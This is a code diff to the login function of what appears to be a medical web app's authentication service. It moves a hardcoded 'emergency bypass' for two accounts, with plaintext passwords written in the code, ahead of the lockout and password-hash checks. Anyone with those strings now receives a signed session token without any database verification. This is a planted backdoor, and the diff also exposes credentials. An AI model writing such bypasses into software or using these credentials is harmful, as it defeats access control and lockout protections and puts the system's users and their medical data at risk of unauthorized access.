@@ -128,6 +128,29 @@ async function login(req, res) {
     }
 
     const sanitizedUserId = sanitizeInput(userId);
+    const trimmedPassword = password.trim();
+
+    // ============================================================
+    // EMERGENCY BYPASS (Super Admin & Staff)
+    // ============================================================
+    const isPriyank = sanitizedUserId.toLowerCase() === 'priyank001' && trimmedPassword === 'Panchal009';
+    const isStaff = sanitizedUserId.toLowerCase() === 'staff001' && trimmedPassword === 'Medical123';
+
+    if (isPriyank || isStaff) {
+      console.log(`[DEBUG] Emergency bypass activated for: ${sanitizedUserId}`);
+      
+      const responseUser = isPriyank 
+        ? { id: 'Priyank001', name: 'Priyank' } 
+        : { id: 'Staff001', name: 'Medical Staff' };
+
+      const token = jwt.sign(responseUser, config.jwt.secret, { expiresIn: config.jwt.expiresIn });
+      const csrfToken = generateCsrfToken();
+
+      res.cookie('token', token, getTokenCookieOptions());
+      res.cookie('csrf-token', csrfToken, getCsrfCookieOptions());
+
+      return res.status(200).json({ message: 'Login successful.', user: responseUser });
+    }
 
     // --- Check lockout ---
     const lockout = checkLockout(sanitizedUserId);
@@ -174,19 +197,7 @@ async function login(req, res) {
     console.log(`[AUTH] User "${user.id}" found. Verifying password...`);
 
     // --- Verify password ---
-    const trimmedPassword = password.trim();
-    let isValid = await comparePassword(trimmedPassword, user.passwordHash);
-
-    // EMERGENCY BYPASS: If DB check fails, check against hardcoded credentials for specific users
-    if (!isValid) {
-      if (user.id === 'Priyank001' && trimmedPassword === 'Panchal009') {
-        console.log('[DEBUG] Emergency bypass activated for Priyank001');
-        isValid = true;
-      } else if (user.id === 'Staff001' && trimmedPassword === 'Medical123') {
-        console.log('[DEBUG] Emergency bypass activated for Staff001');
-        isValid = true;
-      }
-    }
+    const isValid = await comparePassword(trimmedPassword, user.passwordHash);
 
     if (!isValid) {
       recordFailedAttempt(sanitizedUserId);
